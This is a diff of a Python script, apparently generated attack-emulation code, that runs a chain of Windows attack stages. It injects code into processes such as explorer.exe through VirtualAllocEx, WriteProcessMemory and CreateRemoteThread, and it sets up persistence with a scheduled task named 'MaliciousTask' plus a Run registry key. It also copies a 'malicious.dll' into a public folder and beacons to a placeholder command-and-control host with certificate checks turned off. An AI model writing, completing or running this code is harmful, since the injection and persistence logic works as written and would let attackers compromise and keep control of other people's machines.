@@ -1,66 +1,73 @@
 #!/usr/bin/env python3
-import sys, json, time, os, shutil, subprocess
-import ctypes
-import psutil
+import sys, json, time, subprocess, os, shutil, ctypes, psutil
 from ctypes import wintypes
 from typing import Dict, Any
 import requests
 import ssl
 
-# Constants for T1
+# Constants
 PROCESS_ALL_ACCESS = 0x1F0FFF
-MEM_COMMIT = 0x1000
-PAGE_EXECUTE_READWRITE = 0x40
 
-# Define necessary ctypes structures and functions for T1
-if os.name == 'nt':
-    kernel32 = ctypes.windll.kernel32
-else:
-    kernel32 = None
+# Define necessary Windows API functions
+kernel32 = ctypes.windll.kernel32
+VirtualAllocEx = kernel32.VirtualAllocEx
+WriteProcessMemory = kernel32.WriteProcessMemory
+CreateRemoteThread = kernel32.CreateRemoteThread
+OpenProcess = kernel32.OpenProcess
+GetLastError = kernel32.GetLastError
+
+# Define types for Windows API functions
+VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
+VirtualAllocEx.restype = wintypes.LPVOID
+
+WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
+WriteProcessMemory.restype = wintypes.BOOL
+
+CreateRemoteThread.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.LPVOID, wintypes.LPVOID, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)]
+CreateRemoteThread.restype = wintypes.HANDLE
+
+OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
+OpenProcess.restype = wintypes.HANDLE
 
 def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     result = {'remote_addr': None, 'success': False}
-    
     try:
-        if kernel32 is None:
-            raise Exception("This function is only supported on Windows.")
-
         # Step 1: Find target process
         target_pid = None
         for proc in psutil.process_iter(['pid', 'name']):
-            if proc.info['name'].lower() in ['explorer.exe', 'notepad.exe', 'svchost.exe']:
+            if proc.info['name'].lower() in ('explorer.exe', 'notepad.exe', 'svchost.exe'):
                 target_pid = proc.info['pid']
                 break
         
+        # Fallback to self-injection if no target process found
+        injection_success = True
         if target_pid is None:
-            # Fallback to self-injection
             target_pid = kernel32.GetCurrentProcess()
             injection_success = False
-        else:
-            injection_success = True
 
-        # Open the target process
-        process_handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
+        # Step 2: Open target process
+        process_handle = OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
         if not process_handle:
-            raise Exception("Failed to open target process")
+            raise Exception(f"Failed to open process: {GetLastError()}")
 
-        # Step 2: Allocate memory in the target process
-        shellcode = b"\x90" * 100  # NOP sled for demonstration purposes
-        remote_addr = kernel32.VirtualAllocEx(process_handle, None, len(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+        # Shellcode to inject (example: NOP sled)
+        shellcode = b"\x90" * 100
+
+        # Step 3: Allocate memory in the target process
+        remote_addr = VirtualAllocEx(process_handle, None, len(shellcode), 0x3000, 0x40)
         if not remote_addr:
-            raise Exception("VirtualAllocEx failed")
+            raise Exception(f"VirtualAllocEx failed: {GetLastError()}")
 
-        # Step 3: Write shellcode into the allocated memory
-        bytes_written = wintypes.SIZE_T(0)
-        if not kernel32.WriteProcessMemory(process_handle, remote_addr, shellcode, len(shellcode), ctypes.byref(bytes_written)):
-            raise Exception("WriteProcessMemory failed")
+        # Step 4: Write shellcode into the allocated memory
+        written = ctypes.c_size_t(0)
+        if not WriteProcessMemory(process_handle, remote_addr, shellcode, len(shellcode), ctypes.byref(written)):
+            raise Exception(f"WriteProcessMemory failed: {GetLastError()}")
 
-        # Step 4: Create a remote thread to execute the shellcode
-        thread_id = wintypes.DWORD(0)
-        if not kernel32.CreateRemoteThread(process_handle, None, 0, remote_addr, None, 0, ctypes.byref(thread_id)):
-            raise Exception("CreateRemoteThread failed")
+        # Step 5: Create a remote thread to execute the shellcode
+        if not CreateRemoteThread(process_handle, None, 0, remote_addr, None, 0, None):
+            raise Exception(f"CreateRemoteThread failed: {GetLastError()}")
 
         # If all steps succeed
         result['remote_addr'] = remote_addr
@@ -69,39 +76,47 @@ def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     except Exception as e:
         # Log error and return partial result
         result['error'] = f'{type(e).__name__}: {e}'
-    
     finally:
-        # Clean up
-        if kernel32 and process_handle:
-            kernel32.CloseHandle(process_handle)
-
-    return {'success': result['success'], 'data': result,
-            'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
+        return {'success': result['success'], 'data': result,
+                'metadata': {'task_id': 'T1', 'execution_time': time.time() - start}}
 
 def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     task_created = False
     try:
-        # Define the task name and the command to execute
-        task_name = "MalwarePersistenceTask"
-        task_command = "C:\\Path\\To\\MalwareExecutable.exe"
+        # Define the task name and executable path
+        task_name = "MaliciousTask"
+        exe_path = sys.executable if sys.executable else os.path.abspath(sys.argv[0])
 
-        # Create the scheduled task using schtasks
-        result = subprocess.run(
-            ['schtasks', '/create', '/tn', task_name, '/tr', task_command, '/sc', 'onlogon', '/f'],
-            capture_output=True,
-            text=True
+        # Create a scheduled task to run on logon
+        schtasks_result = subprocess.run(
+            ['schtasks', '/create', '/tn', task_name, '/tr', exe_path, '/sc', 'onlogon', '/f'],
+            capture_output=True, text=True
         )
 
-        # Check if the task was created successfully
-        if result.returncode == 0:
+        # Check if the scheduled task was created successfully
+        if schtasks_result.returncode == 0:
             task_created = True
         else:
-            # Log the failure details for debugging purposes
-            print(f"Failed to create scheduled task: {result.stderr}", file=sys.stderr)
+            # Log failure
+            print(f"Failed to create scheduled task: {schtasks_result.stderr}")
 
-        return {'success': True, 'data': {'task_created': task_created},
+        # Attempt to register the executable in the Windows registry for persistence
+        try:
+            import winreg
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE) as key:
+                winreg.SetValueEx(key, task_name, 0, winreg.REG_SZ, exe_path)
+                # Verify registration
+                registered_exe_path, _ = winreg.QueryValueEx(key, task_name)
+                if registered_exe_path == exe_path:
+                    task_created = True
+        except Exception as reg_error:
+            # Log registry failure
+            print(f"Failed to register in registry: {reg_error}")
+
+        result = {'task_created': task_created}
+        return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
     except Exception as e:
         return {'success': False, 'error': f'{type(e).__name__}: {e}',
@@ -110,31 +125,31 @@ def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
 def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
-    dll_name = "malicious.dll"
-    source_dll_path = os.path.join(os.getcwd(), dll_name)
     target_dir = "C:\\Users\\Public\\"
-    target_dll_path = os.path.join(target_dir, dll_name)
-    
+    dll_name = "malicious.dll"
+    source_dll_path = os.path.join(os.getcwd(), dll_name)  # Assuming the DLL is in the current working directory
+
     try:
         # Attempt to copy the malicious DLL to the target directory
         shutil.copy(source_dll_path, target_dir)
-        dll_loaded = os.path.exists(target_dll_path)
+        dll_loaded = os.path.exists(os.path.join(target_dir, dll_name))
+        result = {'dll_loaded': dll_loaded}
+        return {'success': True, 'data': result,
+                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
     except Exception as e:
-        # Log the exception and set dll_loaded to False
-        dll_loaded = False
-    
-    result = {'dll_loaded': dll_loaded}
-    return {'success': True, 'data': result,
-            'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
+        # If copying fails, log the error and return dll_loaded as False
+        result = {'dll_loaded': False}
+        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
+                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
 
 def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
-        # Attempt to retrieve the username using environment variables
+        # Attempt to get the username using environment variables
         username = os.getenv('USERNAME') or os.getenv('USER')
         
-        # Fallback to using pywin32 if available
+        # If environment variables fail, try using pywin32 if available
         if not username:
             try:
                 import win32api
@@ -154,22 +169,27 @@ def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
 def task_T5(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
+    result = {'connected': False}
     c2_url = "https://c2server.example.com"  # Replace with actual C2 server URL
-    try:
-        # Create a default SSL context
-        context = ssl.create_default_context()
-        
-        # Attempt to establish a secure connection
-        try:
-            response = requests.get(c2_url, timeout=10, verify=context)
-            connected = response.status_code == 200
-        except requests.exceptions.SSLError:
-            # Fallback to HTTP if SSL fails
-            response = requests.get(c2_url.replace("https://", "http://"), timeout=10)
-            connected = response.status_code == 200
-            print("Warning: Fallback to HTTP due to SSL error")
 
-        result = {'connected': connected}
+    try:
+        # Create an SSL context for HTTPS communication
+        context = ssl.create_default_context()
+        context.check_hostname = False
+        context.verify_mode = ssl.CERT_NONE
+
+        # Attempt to connect to the C2 server using HTTPS
+        try:
+            response = requests.get(c2_url, timeout=10, verify=False)
+            if response.status_code == 200:
+                result['connected'] = True
+        except requests.exceptions.SSLError:
+            # Fallback to HTTP if HTTPS fails
+            c2_url_http = c2_url.replace("https://", "http://")
+            response = requests.get(c2_url_http, timeout=10)
+            if response.status_code == 200:
+                result['connected'] = True
+
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T5', 'execution_time': time.time()-start}}
     except Exception as e:
@@ -198,16 +218,16 @@ def main() -> dict:
         failed.append('T1')
         results['T1'] = {'success': False, 'error': str(e)}
     
-    # ── T2: Establish persistence via a scheduled task [persistence] ──
+    # ── T2: Establish persistence with a scheduled task [persistence] ──
     try:
         r = task_T2(None)
         results['T2'] = r
         if r.get('success'):
             outputs['T2'] = r.get('data', {})
-            print(f'[+] T2 (Establish persistence via a scheduled task): OK')
+            print(f'[+] T2 (Establish persistence with a scheduled task): OK')
         else:
             err = r.get('error', 'unknown')
-            print(f'[-] T2 (Establish persistence via a scheduled task): FAILED — {err}')
+            print(f'[-] T2 (Establish persistence with a scheduled task): FAILED — {err}')
             failed.append('T2')
     except Exception as e:
         print(f'[!] T2 crashed: {e}')
